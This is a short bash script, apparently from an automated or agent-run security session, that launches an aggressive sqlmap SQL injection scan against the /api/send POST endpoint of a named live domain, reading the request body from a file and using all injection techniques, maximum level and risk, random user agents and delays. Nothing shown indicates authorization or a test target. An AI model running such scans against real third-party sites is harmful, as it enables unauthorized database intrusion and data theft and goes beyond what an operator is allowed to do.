#!/bin/bash
cd /work
U="https://www.infinitycapital.bh"
D=$(cat /work/sqli_data.txt)
mkdir -p tool_outputs
echo "=== sqlmap POST /api/send ==="
timeout 2400 sqlmap -u "$U/api/send" \
  --data="$D" \
  --method=POST \
  --batch --level=5 --risk=3 --threads=4 \
  --random-agent --timeout=25 --retries=2 --delay=1 \
  --technique=BEUSTQ \
  --output-dir=/work/tool_outputs/sqlmap_send2 \
  2>&1 | tail -70
